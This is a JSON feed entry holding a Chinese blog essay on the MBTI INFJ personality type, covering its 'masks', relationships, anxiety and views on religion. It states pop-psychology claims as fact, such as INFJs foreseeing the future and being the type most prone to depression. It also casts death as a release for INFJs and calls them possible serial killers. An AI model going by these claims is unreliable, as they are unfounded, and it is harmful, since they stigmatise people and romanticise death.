            "url": "http://www.n1h1l157.live/2023/04/01/MBTI/INFJ%E8%A7%A3%E8%AF%BB/",
            "title": "INFJ解读",
            "date_published": "2023-03-31T16:00:00.000Z",
            "content_html": "<p>深沉，神秘，执拗，忠诚，和富有使命感。温和、有同情心、关心他人、富有想象力、注重人际关系等。具有想象、善于倾听，富有同情心。重要的是，他们不但说，而且说到做到。</p>\n<h3 id=\"性格特征\"><a class=\"markdownIt-Anchor\" href=\"#性格特征\">#</a> 性格特征</h3>\n<p>给人的第一感觉是深沉，尽管所有内向型人的话都比较少，都比较沉默，安静，但是 INFJ 却能在沉静之中额外给人一种深邃的感觉。</p>\n<p>比较矜持，你知道他，但完全看不懂他，显得很神秘。一旦 ta 选定了值得信赖的人就会义无反顾地支持他。</p>\n<p>从不停止学习，总是不断地进行自我成长和发展。他们清楚他人的需求，他们能够先于其他人预见到冲突何时爆发。</p>\n<p>很少有人能完整地洞悉 INFJ 丰富的内心世界以及他们丰富的想象力、创造力和各种抽象思维和概念。</p>\n<p>最强大的直觉，这种直觉使他们获得了一种预知未来的能力，关于他们自己和他人的人生的未来。</p>\n<p>经常可以在自己的意象里看到他人的未来，看到他人以后会变成什么样或者将会遇到什么事情，能看到将来在这个人身上会发生什么，比较准。</p>\n<p>根据自己的预见能力和对人性的把握会找到本来你要走的路，只是指引你，帮助你，支持你。</p>\n<p>在四种 NF 当中，INFJ 对人性的把握可能是最为深刻的，这也是他们强大直觉的一个产物。而且 INFJ 的想象力是他们自己可以控制的。</p>\n<p>INFJ 最喜欢也是最擅长使用隐喻，他们经常会用一种隐喻的方式来描述一个人或一件事情，并且往往都是能够抓住对象本质的一种描述。</p>\n<p>执拗如果失控就会变成固执，把自己内心的信念神圣化，然后完全听不进别人的意见；而如果过度地利用自己的想象力修改现实就会导致和大多数人的沟通困难，加深自己疏远现实的倾向。</p>\n<p>经常可以一眼看透别人，又有一些坚定的信念。但是他们观看世界的角度依然可能使 INFJ 变得很清高，有脱离群众的危险。</p>\n<p>infj 的神秘且强大的内心，来源于对自我的洞察，“除非我们已认识了自己，否则不可能真正地认识他人；除非我们认识了他人，否则不可能真正地认识自己。”</p>\n<p>在通过 “理解” 的方式与外界交互建立联系的过程中，INFJ 形成了自己透过表象探寻内隐动机的独特视角，不仅用于观察别人，也用于观察自己。</p>\n<p>在与自我内在进行连接的过程中，发现了 “我” 的信仰所在，“我” 的内在归属，从而以践行的方式对外扩展，用于建设外界环境。</p>\n<h3 id=\"最不健康的人格\"><a class=\"markdownIt-Anchor\" href=\"#最不健康的人格\">#</a> 最不健康的人格</h3>\n<p>物极必反。</p>\n<p>infj 本身非常矛盾，而且几乎每种特质都有点极端，矛盾极端就会使内心产生强烈的割裂感。</p>\n<p>首先本身 nfj，直觉，情感，又有着自控力，这样的人在人群中一般都是比较受欢迎的，被人所喜爱的，按理来说这样的人应该能够在与人相处中获取能量，但偏偏 infj 是 i 型，更喜欢独处，又擅长社交，情商高，这样外在和内在的反差矛盾让 infj 十分需要独处，却又因为自身特质不得不社交。</p>\n<p>再者 ifj，参考 isfj，infj 也是温柔的人，但两者的温柔不同，ifj 会给人细腻，知性的感觉，看起来应该很注重实际和细节，可 infj 偏偏又是直觉型，这也就意味着 infj 内心的又一斗争。infj 的内心比她看起来叛逆，傲娇得多，总是能无意间发现许多细节，但内心其实又感觉自己没那么耐心，这也是矛盾之一。</p>\n<p>接下来 inj，内倾直觉自控力，听起来应当是重视自我判断且理性的冷酷狠人，参考 intj，可这样的情况却又是 f 人，这让 infj 外热内冷，明明应当是高冷的人，却又重视情感，这对于 infj 来说挣扎又痛苦，明明想保持冷漠，可又无法对人的感情忽视不见，这也是说 infj 是 f 里最 t 的人格的原因，inj 让 infj 能够保持清醒，f 让 infj 能够感受各种情感，而拥有敏锐直觉的 infj 注定清醒地痛苦着，极端的特质矛盾让 infj 的内心对立，灵魂身体的抽离感加剧。</p>\n<p>然后是 inf，內倾直觉情感，这样的人会让人感觉更愿意建立自己的情感世界，减少与外界的联系，遵从本心，可 infj 与 infp 或许内心情感有些相似，但其他地方几乎截然不同，j 让 infj 的矛盾加剧，行为和意识的对抗，让 infj 既无法像 infp 一样沉浸在自己的精神世界，也无法像其他 j 型那样认知与行为比较统一。</p>\n<p>在功能上，infj 的对外功能是 fe 和 se，这两者使得 infj 具有高宜人性，因此 infj 也常常看起来像 e 人，外表好看性格又好情商高，往往人缘好而且没什么攻击性，常常接触不久就让人喜欢且信赖，但对内 ni 与 ti，可以说相当抽象且不带人性味，这也是为什么 infj 外热内冷，外在和内在的极致反差，也让 infj 拥有了无数面具的特质，强大的 ni-ti 让她能够感知如何以对方喜欢的方式与其相处，并迅速让对方对自己产生好感，但 i 的本质让这种矛盾的痛苦更加极致，这也是 infj 傲娇的原因。物极必反，冷热交替让这种人格很难处在一个合适的心理状态，长期下去，很容易导致微笑抑郁症，这也是 infj 是 mbti 里最容易患抑郁症的人格的原因。</p>\n<h3 id=\"在社交中的距离感\"><a class=\"markdownIt-Anchor\" href=\"#在社交中的距离感\">#</a> 在社交中的距离感</h3>\n<p>不肯暴露弱点缺点和负面情绪，不愿与他人起冲突，其实是潜意识 “不信任对方” 的反映。这确实是打造 “被多数人认可的正面形象” 的最佳手段，也可日常保护自己，但是对于那些想要与之更进一步的人，却起到了阻碍作用。</p>\n<p>很多人无法理解 INFJ 的出发点，对他们来说隐藏自己弱点的人是很可怕的，人都有恐惧未知的心理，找不到弱点又直觉很危险，就只能用贬义词 “虚伪” 来提醒自己。</p>\n<p>老头们自身情感都被压抑着为什么还要奢求他们分出一点爱？他们对自己有爱吗？不要强迫他们从仅剩的一点感情里拿出大部分来爱人，他们光是维持日常秩序人际和谐就已经去了半条命。</p>\n<p>infj 需要一个理由，这个理由要超过任何现实尺度，具有绝对置信的属性，这个属性无关逻辑，无关感情，却必须事实，实现的瞬间就绝对成立。</p>\n<p>疏离淡漠，超会隐藏自己的情绪，看不出来他们的感情，看似什么都不懂实际上什么都懂，有种白切黑，腹黑的感觉，有种非常不真实的感觉，非常神秘。</p>\n<h3 id=\"简短地描述\"><a class=\"markdownIt-Anchor\" href=\"#简短地描述\">#</a> 简短地描述</h3>\n<p>有一种雪。<br>\n没有风，静静地下，柔和，甚至空气是温暖。<br>\n直到这个过程结束，才会令人感到彻骨的寒冷。<br>\n这就是 Ni-Fe。</p>\n<p>似月光般清冽，素与暗夜相宜。</p>\n<p>ni-fe，在陌生之中，直击灵魂。</p>\n<p>我不会无意识就暴露自己，你看到的我是我想要你看到的我。</p>\n<p>我只愿一个人去探索这个神秘的世界……</p>\n<p>想要孤独的自由，却离不开人性的温暖。</p>\n<h3 id=\"ni带来的影响\"><a class=\"markdownIt-Anchor\" href=\"#ni带来的影响\">#</a> Ni 带来的影响</h3>\n<p>好像有了这种天赋作为交换，你就会失去过去起忆。失去对此刻现实感官的体察和享受也失去对自我存在的感觉。</p>\n<p>但我其实已经放弃了真实沟通，每天回家也带着面具生活，习惯性温和，间歇性沉默，偌大的情绪和思路就像陨石投进自深深处的深渊，层层叠叠波到岸边的时候已经近似于无，湖面上只有微澜。</p>\n<p>在所有类型中，infj（和 intj）是与自身身体最脱节的。不仅因为它们的劣势功能是 S，而且 infj 使用 Se 而不是 Si，而 Si 是赋予一个人身体内在感觉的功能。infj 通常表现出一种无实体感，仿佛生活在一种永恒的、梦幻般的状态中。</p>\n<p>infj…… 与疏离感作斗争，他们经常培养出一种讽刺的幽默感，这种幽默感可以保护他们不受自我暴露的影响，并确保他们有积极的关系。</p>\n<p>INFJ 有一个根深蒂固的愿望，即理解人类的宏大图景，以及它的目的是什么。infj 不断地从不同的角度观察情况；缩小以查看鸟瞰图，或者放大以分析相关人员的情绪和感受。INFJs 渴望发现人类经验中的目的和意义，不仅是为了自己，也为了他人。</p>\n<p>现实意义来说，infj 越少越好，这是一个极为痛苦的性格，一生过的也很扭曲。</p>\n<h3 id=\"外在面具\"><a class=\"markdownIt-Anchor\" href=\"#外在面具\">#</a> 外在面具</h3>\n<p>1、INFJ 刚开始的面具，是成为别人所喜欢的样子，所需要的样子</p>\n<p>因为别人不同，所以 INFJ 需要不断切换<br>\n因为别人喜欢的样子不同，所以 INFJ 内心会有冲突和矛盾</p>\n<p>2、当 INFJ 意识到自己拥有面具，缺乏自我的一面时，便开始寻找自我，想要定格自我，固定自我，正视自我，可是这种执念和追寻是痛苦的，因为 INFJ 根本就搞不清楚自己究竟是什么样子的，容易把自己困于 “INFJ” 表象的枷锁；</p>\n<p>INFJ 应该是这个样子的？INFJ 怎么可能是那个样子？我处于 INFJ 哪个阶段？这一切都是虚妄，都是假象，导致 INFJ 们越来越不自由，越来越不安和困惑</p>\n<p>INFJ 的执念很深，踏遍精神世界的千山万水，游历灵魂领域的五湖四海，仍然求不得，只留下神秘、复杂、难以理解的样子</p>\n<p>3、其实，我觉得 INFJ 就是一泓湖水，一面镜子，本来就没有固定的自我，因为自我都是相；</p>\n<p>照见山，便是山；照见水，便是水；照见圣人，便成圣人；照见魔鬼，便是魔鬼；</p>\n<p>无所映照，空空如也，怎么能够寻到一丝相呢？<br>\n本来无一物，何处惹尘埃？<br>\n不在心学、佛禅顿悟，就难得究竟自在。</p>\n<p>4、所以，INFJ 的内在便是镜子，便是湖面，便是空，便是非空；</p>\n<p>面具便是镜花水月，无所不映照，千变万幻，却什么都不留下<br>\n心外无物，知行则合一</p>\n<h3 id=\"镜子人格\"><a class=\"markdownIt-Anchor\" href=\"#镜子人格\">#</a> 镜子人格</h3>\n<p>会有人喜欢一个内心坦率、直白、纯粹得如镜子一般的人吗？</p>\n<p>不会的。人们喜欢和自己更为相似的人。和更相似的人待在一起才会更有安全感。</p>\n<p>成熟的 INFJ 或许依然是性格温和的人，乐于助人，共情能力很强，很少悲观厌世，也不再愤世嫉俗，只以一颗平和的、悲悯一切存在的心来看待世界，坦然地接受自己的不足，世界的不完美。</p>\n<p>可是正因为如此，和这样一个里面也是外面，外面也是里面的人待在一起，人会觉得有点恐惧。因为这样的一个人的存在，映照出了他人心中的虚假、恶意，与恐惧，镜子有时也揭穿了人们自以为很妥帖的掩饰。</p>\n<p>在镜子面前，一个人是什么样就会照出什么样的。而人对自己的了解，既是最清楚的，也是最不愿承认、最自欺欺人的。</p>\n<p>人们在这面镜子中看到了自己身上自己不能接受的一切，又在恐惧的驱使下，将这些转化为攻击冲向镜子。</p>\n<p>因此人们看不明白 INFJ，人们认为 ta 们神秘诡异，人们不相信，世上人人都在装模作样，这个人真的坦诚无畏，直白了当，那也是装出来的。</p>\n<p>人，为了自己的安全感，是不介意一次又一次欺骗自己的。因为告诉自己，INFJ 也是装的，他们才能心安理得地认为，世上的人都和自己一样。</p>\n<p>所以，镜子 &amp; INFJ 的命题是不是很可怕？</p>\n<h3 id=\"轻而易举地斩断\"><a class=\"markdownIt-Anchor\" href=\"#轻而易举地斩断\">#</a> 轻而易举地斩断</h3>\n<p>然后对发展更为成熟的 INFJ 而言，另一点让人感到很可怕的事情是，他们似乎从不念旧情，不动感情，任何关系都能做到毫不留情地离开。</p>\n<p>这其实在 INFJ 心中也是一种 “坦率”。发展更为成熟的 INFJ 能够区分自己的内心欲求，与外界现实，不再以内心的标准来对外界提出要求。</p>\n<p>他们能够看到，并且接受世间一切存在，因此一些在人们看来撕心裂肺的痛苦在他们眼中，都化为了原本的模样：只是存在，一件令人感到叹息、遗憾的存在。</p>\n<p>他们能够区分什么是人为设定的，什么是命运带来的，尊重命运，尊重世间一切的运行规则，在庞大的 “道” 面前谦恭谨慎，坦然顺服，不再自大无知，不再以自己的欲念为中心，不再以自己的滤镜来看待万事万物的存在，因此，他们没有应该放手或应该不放手的观念，而是认为一切事物到了分开时，只是分开而已。他们不会为这些 “分离” 而受困。</p>\n<p>因此，他们内心坦率富足，不为自己的执念而活。</p>\n<p>但是这种看起来冷心冷情的人，就会使对他牵肠挂肚、念念不忘的人感到痛苦且可怕了。</p>\n<p>不过 INFJ 明白人与人之间，有时候只能是擦肩而过，最终在一起也只是彼此痛苦，不论这关系是源于亲情、友情，还是爱情。</p>\n<p>人们会发现，没有什么感情能牵制住这样的 INFJ，只有他们自己知道自己追求什么，能让他们留下，让他们停下脚步的，除非他们自己愿意。</p>\n<p>你说你爱 ta，你为 ta 掏心掏肺祈求 ta 留下，ta 内心却早就知道你们之间的只是无谓的纠缠，所以你只能看着 ta 离开，而 ta 也很清楚，你想要跟 ta 一起从来不是因为真的懂，真的爱，而是因为你在 ta 身上获取到了你自己的依恋感。</p>\n<p>因此，人要区分自己内心的 “我想”，“我要”，“我要求”，和现实的 “存在”，哪怕这存在是自己不想要的。比如，无法共处，比如，这样一群清醒且 “可怕” 的人。</p>\n<p>人畜无害只是一种 “无缘大慈，同体大悲” 的悲悯罢了。</p>\n<h3 id=\"如何看待死亡\"><a class=\"markdownIt-Anchor\" href=\"#如何看待死亡\">#</a> 如何看待死亡</h3>\n<p>INFJ 类型的人，天生活在沼泽里。说实话，世人害怕的死亡，对于 INFJ 类型的人来说，在一定意义上真的是解脱，甚至是追求。</p>\n<p>INFJ 类型的人，悲观又消极，无法接受现实有没有办法改变现实的时候，活着的每一天都是地狱。</p>\n<p>很多时候，答案其实就在自己心里，对于 ni 使用者来说，读一本书和一百本书没什么区别，读书只是为了让自己能更好地挖掘内心的答案而已；对于 ni 来说，读书不能获得任何道理，道理是你本心本来就知道的，只是蒙上了一层灰，需要读书来当抹布擦掉罢了。当答案浮现到意识层面时，就是顿悟之时。</p>\n<h3 id=\"infj受欢迎吗\"><a class=\"markdownIt-Anchor\" href=\"#infj受欢迎吗\">#</a> INFJ 受欢迎吗</h3>\n<p>在正确的圈子里会是领袖人物，是促成这个圈子的关键人物。但是可悲就可悲在属于 infj 的圈子太少了，大部分人都不懂欣赏 infj 的长处，所以会排斥魔法老头们。</p>\n<p>基本属于无法被忽视的存在，反面正面评价都很极端，大多数人会明显感知到这个人和其他人不一样，哪怕表面再温和好说话。INFJ 如果 Se Ti 撑不起来很容易自闭逃离人群，因为承受不了每个人的投射。</p>\n<p>就像是溺水的人，已经快要淹死在自己无措的情绪里了，但是他仍然能抛开这一切，抛开自己正在经受的苦难，以一种几乎冷静得过分的态度，在解决和面对自己。</p>\n<p>infj 只有空空的镜子，将对方给予的东西回馈回去。但是若是对方给予的是种发自内心的真情，infj 没办法回报同等的东西。所以 infj 害怕认真的感情。</p>\n<h3 id=\"阶段性模拟人格\"><a class=\"markdownIt-Anchor\" href=\"#阶段性模拟人格\">#</a> 阶段性模拟人格</h3>\n<p>文章来源:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0NjA1NzEwMi9hbnN3ZXIvMTM4MTgwNjg5OA==\">https://www.zhihu.com/question/346057102/answer/1381806898</span></p>\n<p>一方面是个人成长了另一方面是为了更适应这个社会</p>\n<p>好好说人话就是：两方面，社会化和个性化同步发展，理想是发展能较为平衡，不要出现过度倾向。</p>\n<p>infj 是孤独的，但不会是孤单的。正因为这种特质，infj 并不贪恋长久的关系，有很好，但没有那也是很正常的。</p>\n<p>这里的长久关系不是指那种 —— 天天甜甜蜜蜜腻腻歪歪可可爱爱你我他的关系。而是真正精神上的共鸣，共同的发展。</p>\n<p>当我们一周两周甚至一年两年不见面，再见时我们都进步了都变了，但我们还是同步的，我们聊的话题依旧能吸引对方。</p>\n<p>就像是在宇宙之中，星星是我们不断学习的课程课业。每个人都在漫步遨游，触碰一个又一个星星。有人结伴而行，谈天说地，约定好一切，最后却离得越来越远。</p>\n<p>但有些人，不曾约定，甚至是是盖住了自己的路线，不为对方所知。可在我触碰星星的那一刻，我就知道，这里一定还有一个人 —— 是你。</p>\n<p>接下来谈一下模拟人格和短期关系的问题。</p>\n<p>infj 走自己的路寻找星星，不会让任何人一直陪伴自己。陪伴与依赖是他们期待的，但他们也知道没有人能让自己依赖一辈子。</p>\n<p>这是事实，他们深知天下真的没有不散的宴席，每个人都会去往自己的路，只是时间的先后问题罢了。</p>\n<p>infj 会是朋友圈里的雏鹰，他们不会隐瞒任何他们的理想。或许认识他们的时候，就大概猜到了，他们不会为任何人事物驻留，总有一天他会走向自己的天地。</p>\n<p>而短期关系的出现，就会引发 infj 不断的修改自己的外在表现人格。</p>\n<p>包括我想让自己成为什么样的人，或者让你觉得我应该成为什么样的人。不知道其他类型的人格怎么样，但 infj 确实很容易做到。</p>\n<p>提一句，这里矛盾就出现了。他们是忠诚直接，不做隐瞒的。但外在人格却各种各样的，甚至花样多到有时候会让人觉得不太和谐的。真的很奇怪，但也会让人觉得很神秘，好像你接触到了他，但你又觉得自己好像根本无法认识他们。</p>\n<p>哈哈哈哈哈哈其实 infj 真的很复杂，但复杂其实就是他们本身。infj 没办法用挖的方法去对待，不是你挖的越深，就越了解。infj 就是复杂和空的对立结合体，挖的逻辑在这是行不通的。</p>\n<p>infj 每个阶段都不一样，只要是来到一个新环境，遇到另一批完全不同的人，与以往的圈子相隔裂开的一批人。</p>\n<p>infj 就开始当场夹馅，表演过程中能把自己都糊弄过去的，绝对对呀我就是这样的人嘛。</p>\n<p>养成中内外 fe 都很高的 infj，可能会喜欢跟人说自己特别悲惨的经历啊，或许不是什么大事，但敏感的他们真的很受伤。</p>\n<p>这个阶段的 infj 从来都不会把自己内外人格对立起来，他们开放自己，不管你们的关系如何，只需要一点点的善意。他们太过的希望得到你的垂怜甚至是乞求你的垂怜你独一无二的偏爱。</p>\n<p>这有点病态，来源于扭曲的环境以及养成中的 infj 比起重视自己的责任和发展，更希望来一个人解救他们，我会属于你，而你也得属于我。</p>\n<p>infj 当然知道自己很疯有毛病，处理关系方面一点都不健康。但这时候只是更把希望放在别人身上，乞求你，来爱我吧。</p>\n<p>这道题是无解的，在不知道多少次之后，infj 可能就放弃了。infj 再也不会放希望给任何一个人了，这不是说 infj 变得什么冷漠了呀中二病了呀。是他们被榨干了，真的没有了，没有可以给你的了。</p>\n<p>这之后 infj 就只会热衷于短期关系了，对人群中最成功最完美最傲慢的那个人兴趣相对最高，会好奇他们是如何克服一切走到这个位置上的。如果这个人还会被我塑造的人格吸引，infj 成为了他们的独一无二。甚至告诉我他一切弱小又无助，被欺辱而无人拯救的过去，那 infj 的心脏会为他们直接爆炸！</p>\n<p>但 infj: 我亲爱的，我当然愿意治愈你，但这之后，你要是想跟我发展关系，那我一定马上就跑</p>\n<p>短期关系需要 infj 不断的修改矫正自己的外在人格，直到不管在哪一个群体面前，都能拿出最合适的那一面那一个人。</p>\n<p>这需要 infj 更多的直觉＋理论填充学习。infj 喜欢自己这样的成长，尤其是把外在人格改为 e 的时候，虽然要克服巨大的困难。但从自卑又内向的交友圈空气，变成社交中最亮眼的最有人缘的靓仔，会获得巨大的成就感以及自我肯定，这一切都是自己进化了的最好证明。</p>\n<p>克服一切不可能的。只要 infj 想，没有什么是不可能的，就是这么野就是这么酷。</p>\n<p>这里再提一下部分 infj 的成长会从一开始的傲慢被暴打后转向自卑，从自卑再到自信不在意，再到博爱众生。</p>\n<p>大概就是由人性到神性的进化。</p>\n<p>由外软内软变成外软内钢铁。</p>\n<p>infj 如果年幼或者初期不懂事时做了些让自己后悔的事，长大后是根本无法忘记的。一旦闲下来或者快睡觉的时候，脑子里开始自动播放那些让自己羞愧不已的事。</p>\n<p>其实也不会是什么大事，撑死就是一堆屁大点没人记得的事。但 infj 追求绝对的做事完美。</p>\n<p>其中包括自身过度自律，绝对遵守规则死板，就算是特别长的队伍也要死排着那种等。</p>\n<h3 id=\"叛逆且冷漠\"><a class=\"markdownIt-Anchor\" href=\"#叛逆且冷漠\">#</a> 叛逆且冷漠</h3>\n<p>善意极大的近神 infj 会是很好的指导者，他不会告诉你你该怎么做。只会告诉你你走在自己的路上，给你尽量多的经验和最优解。因为这是人最需要的爱，足够的自我空间。</p>\n<p>同时他也会告诉你，你是独一无二的，没必要把自己和他人的人生重合进而模仿出自己的一生。</p>\n<p>就算你想当个懒鬼永远躺着，他们也只会告诉你如何舒舒服服的当个懒鬼躺着。他们尊重每一个人，不受社会标准观点限制。</p>\n<p>infj: 叛逆又冷漠的我.jpg</p>\n<p>infj 在最后学习神性的阶段，会放下人性，变成所谓温柔又冷漠的人。可以说他爱你，但也绝对可以说他并不在意你，也并不会出于私心爱你。</p>\n<p>有点类似于 “天地不仁以万物为刍狗”。</p>\n<p>但这不意味着他们就是高高在上的，他们依旧是坦诚面对一切自己的情绪想法的，不管好的不好的。只是他们更了解这个游戏世界的规则了，没什么能动摇他们本身最在意的。</p>\n<p>所以，多数 infj 如果没有在一开始未发育期遇见那个人，后期思想醒悟了可能就会觉得两性关系过度复杂，很容易脱离控制，有很强不稳定性，就会不想谈恋爱结婚。</p>\n<p>最后，成功变成一条老单身狗，好惨好惨好惨。（没有那种俗世的欲望)</p>\n<p>突然想到一句话，虽然我抽烟，喝酒，烫头，染头，纹身，会打架，但我真的是个好孩子。这放在 infj 身上可能就真的是真的哈哈哈哈哈哈哈，可能真的都是孤独到死哈哈哈哈哈哈哈，连异性的手都没碰过那种。</p>\n<p>如果你想勾搭 infj，只需要注意 —— 真诚＋负责＋证明你真的能陪伴 infj 一辈子。另外，其实 infj 大多看眼缘，一眼就定生死。死追是不管用，不管用，不管用！不要浪费自己的时间。</p>\n<p>如果能追，那 infj 还会在期间慢慢的考察你。再次警告警告大警告 —— 期间绝对不要撒谎，就算是善意的也不行，这是基本问题！infj 绝对讨厌那种事情脱离自己预知范围的情况。</p>\n<p>个人喜欢性子直明白事但有意思的人，有点两面性那种，太正直单纯了反而有点无力。</p>\n<p>比如那种傲娇嘴损但老实做事暗地里帮别人的，又有点自恋的喜欢别人夸自己的人，不管男的女的，真的很可爱。</p>\n<p>大概是因为 infj 包容性很强，其实各种各样都很爱，只要不是那种畏畏缩缩遮遮掩掩的，做你自己，就是最好的。</p>\n<h3 id=\"焦虑强迫症\"><a class=\"markdownIt-Anchor\" href=\"#焦虑强迫症\">#</a> 焦虑强迫症</h3>\n<p>infj 或多或少都沾点焦虑症，很容易思考的很远，非常痛苦，但又控制不住，没办法不去想。<br>\n这对 infj 来说就像是一道选择题无限次出现在你面前，一个答案是固定的，只要你选择另一个逃避问题的答案，他就又会跳出来。</p>\n<p>所以独处时 infj 很容易精神抑郁垮起个脸，如果发展阶段有灵魂挚友，可能更会藏着掖着。</p>\n<p>因为发展阶段的 infj 很讨厌别人跟自己聊负能量，反过来也不喜欢让自己的朋友接受这些。</p>\n<p>他们是真的打心眼的喜欢自己的朋友，我愿意爱你的所有，这种不怎么能定义，但是是真的爱。所以不希望朋友听到这些东西之后也来思考这些问题变得抑郁。</p>\n<p>处理过程中可能会出现叛逆情况，比如被迫成长阶段。</p>\n<p>“我不读书了，凭什么明明是社会给我提供选择，但我却被强制的按规矩完成。”</p>\n<p>会瞎搞烫头，染头，纹身之类的。</p>\n<p>思想觉醒了，但 infj 还是必须要被迫接受这一切，脱离控制。</p>\n<p>如果父母还比较躁，无意间总是压迫到 infj 孩子，或者早期 infj 经历过校园暴力（包括冷暴力），以及遇到各种打碎敏感小心心的事。</p>\n<p>早期就导致 infj 会很容易人格扭曲，变得奇奇怪怪的。可能会突然情绪暴躁，突然又低落绝望想不开，过分点的甚至想杀人。</p>\n<p>但这也只是想想，infj 非常清楚后果，多半不会这么做。但极端情况也说不准…… 变成死变态，连环杀人犯也不能说是完全没有可能。</p>\n<p>大多情况下 infj 温柔又和蔼，除非你硬要搁人家雷区蹦迪，这里指一些小动作背后遮遮掩掩的恶意，infj 真的超级讨厌这种小阴东西。</p>\n<p>就算是当面吵一架对 infj 来说还会觉得你这人蛮好的不错不藏不瞒。</p>\n<p>说真的，他们不会是那种表露自身厌恶的人，只会在脑子里模拟现在该用什么东西砸爆你的头，真想让你从世界上消失。</p>\n<p>不过你要是非得蹦迪，还要花式蹦迪，开着彩灯 bgm 蹦。那 infj 就会真的抱着一种光脚的不怕穿鞋的思想，我要跟你同归于尽，弄死你，我再跟你一起下地狱去。</p>\n<p>infj 其实对生死没那么在意，我把每一天都过得好，过成自己想要的，本身我就不会后悔。</p>\n<p>成长阶段的 infj 是光影两分化的，越是积极向上，满满的正能量，不断的鼓励人，就越是疯狂崩溃压制自己。</p>\n<p>就像尼采说的那句话 “其实人和树是一样的，越是向往高处的阳光，它的根就越要伸向黑暗的地底”。</p>\n<p>他们的伤痛从来不会好，甚至自己都会不断的揭开那个长好了的疤，真正意义上的，直面一切，他们真的是想从根本上解决这些问题的。</p>\n<p>哈哈哈哈哈哈表面可能完全看不出来 infj 的。infj 真的还是个老千层饼，你以为他是 enfj，扒开是 intj，你以为你懂了。再来发现人家是 intp，你又以为你懂了，结果又变成 infp 了。你迷糊了，其实人家是 infj 哈哈哈哈哈哈哈。</p>\n<p>你可以试试正儿八经的跟他们讨论哲学性问题，尤其关于宗教，保证你试了就知道了。</p>\n<p>infj 是自由的，孤独的，真诚的，愿意负起一切责任的，关爱他人，重视亲密关系，为了自己的信仰可以抛去一切的。</p>\n<p>直观感受上来说，他们看起来会像头狼，但真正的他们是会走往各处寻找自我的鹰。</p>\n<p>他们享受自由，但也明白自由是存在于最小限制中，无限制的自由根本不存在。</p>\n<p>他们也享受孤独，愿意把一切时间放在自己身上，看书，学习，探索自己的内心，由此获得能量让自己不断的更好。从而更好的帮助，指导他人。</p>\n<p>想让自己成为 infj 的归宿是很难的。</p>\n<p>最好别那么想，一方面他们的好感度基本上为 0，但他们偏偏会让你有种错觉，他的眼里只有你，他的整个世界就是你。</p>\n<p>这真的很容易让人误会让人做出超越这个好感度的事，比如干涉 infj 的私事，决定，那你就真的翻车了，这不怪你。</p>\n<p>infj 在这期间是希望对方能时刻保持自我，让 infj 也保持自我。而且 infj 喜欢自己贴上去的肢体接触，但并不喜欢别人直接亲近上来。这些都是 infj 麻烦且奇奇怪怪的隐性条件。</p>\n<p>另一方面假设好感度真让你刷满了，那恭喜你！喜提死变态一只！如果你享受他们的占有欲，并以此获得满满的安全感，那你一定会幸福死，带着我的祝福滚蛋。</p>\n<p>但如果你讨厌，那 infj 可以瞬间说不爱就不爱，咱俩不合适，拜拜就拜拜了，果然不应该随意的信任别人啊。</p>\n<p>之前好像有很多人试图攻略 infj 型人格来着，哈哈哈哈哈哈哈哈哈哈哈哈哈别作死，infj 真的是最反套路，最讨厌套路的。他们只需要真诚，坦白一切自己好的坏的，这颗心就是最难得的。</p>\n<p>其实 infj 有一点还是挺好辨认的，他们会很专注的看着你的眼睛，直勾勾的那种。会让人有种光秃秃的感觉哈哈哈哈哈哈哈，不管是男的女的都会这样，所以，很容易让人产生错觉。</p>\n<p>infj 贼大的一个特质：性别感那是真的弱。</p>\n<p>尤其那种若即若离的感觉，明明表面上关系巨好，但实际上又摸不透这个人。会很难定义自己和这个人的关系，朋友？闺蜜？挚友？感觉都不对，会有心跳的感觉，很微妙。（来自朋友的朋友的吐槽）</p>\n<h3 id=\"解剖自己的本能\"><a class=\"markdownIt-Anchor\" href=\"#解剖自己的本能\">#</a> 解剖自己的本能</h3>\n<p>文章来源:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0NjA1NzEwMi9hbnN3ZXIvMTM4MTgwNjg5OA==\">https://www.zhihu.com/question/346057102/answer/1381806898</span></p>\n<p>可能是因为思考很多的原因，人也比较灵，但却找不到原因，科学上解释不了自己的问题，转向宗教和玄学，其实都是为了更好的放下自己的负面暴躁疯狂。</p>\n<p>这并不代表 infj 就不相信科学了，他们是复杂和空的融合矛盾体，他们看，看很多，看特别多，也不代表信奉。</p>\n<p>如果他们在迷茫期向人求助了，但是没人能解释清楚，还要 infj 不要想了，说正常人根本不会想这些问题。</p>\n<p>那这个会在 infj 求指导的名单里直接排除。</p>\n<p>事实上 infj 认为本来世界上就没有正常人，大多是拥有部分共同想法想要抱团去同化别人，不被同化的就是异类。</p>\n<p>infj 并不会在意自己是否会成为这个异类，异不异类的不过是别人贴的标签罢了。本着别人关我屁事，这是我自己的路的想法，继续研究。</p>\n<p>只要是能让 infj 变得更加优秀，美好，完美，他们都愿意去相信，去做。</p>\n<p>你可以跟 infj 聊各种休闲玩乐，但你要是跟人家聊思想觉悟。多半会从你试图同化 infj 悄悄地就变成 infj 同化你了，并且期间你并不会意识到。</p>\n<p>infj 解剖自身是病态化的，强硬的要求自己去直视一切自己不完美的地方，让自己的一切丑陋面孔暴露，绝不给自己找任何理由。</p>\n<p>绝对追求完美，这种东西，只有直视了才能让自己更好的成长。</p>\n<p>另外真的会有那种，被宗教，玄学吸引的感觉。很奇妙也有点渗人。</p>\n<p>infj 绝对不会信仰任何宗教。举头三尺有神明，尊重敬爱是我需要做的。但宗教真的很空，infj 真的超级实用主义者。</p>\n<p>初阶段成长阶段的 infj 会很讨厌人多的地方，部分社恐，变成宅男宅女，反正比跟别人交流快乐。跟别人交流就宛若在消耗自己的能量，最后还会死机。</p>\n<p>最后：没有两个 infj 会是完全重合的。</p>\n<p>成长的路子和最终形成的表露人格也不同。不要被我误导了就去抓 enfj，intp，intj，infp 什么的哈哈哈哈哈哈</p>\n<h3 id=\"爱情与身份认同\"><a class=\"markdownIt-Anchor\" href=\"#爱情与身份认同\">#</a> 爱情与身份认同</h3>\n<p>INFJ 的爱情观是理解，信任，忠诚和奉献。</p>\n<p>因为 Se（外倾感觉）弱项功能的影响，INFJ 会对外表好看的人产生兴趣，但是如果在首次交流中发现对方说话的内容很肤浅，会瞬间感到无聊想要拉开社交距离。当对方精神世界中的一个闪光点击中 INFJ 后，他们才会产生真正想要深入了解的欲望。</p>\n<p>INFJ 